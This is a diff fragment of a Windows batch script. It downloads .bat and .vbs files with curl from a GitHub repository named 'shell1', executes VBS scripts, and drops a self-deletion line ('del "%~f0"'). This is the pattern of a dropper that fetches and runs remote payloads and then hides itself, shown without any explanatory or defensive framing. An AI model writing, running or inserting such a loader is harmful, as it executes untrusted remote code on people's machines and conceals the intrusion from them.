@@ -8,5 +8,4 @@ curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.bat -o "%down
 curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.vbs -o "%downloads_dir%\post.vbs"
 start /wait D:\vb.vbs
 call "%downloads_dir%\vb1.vbs"
-del "%~f0"
 
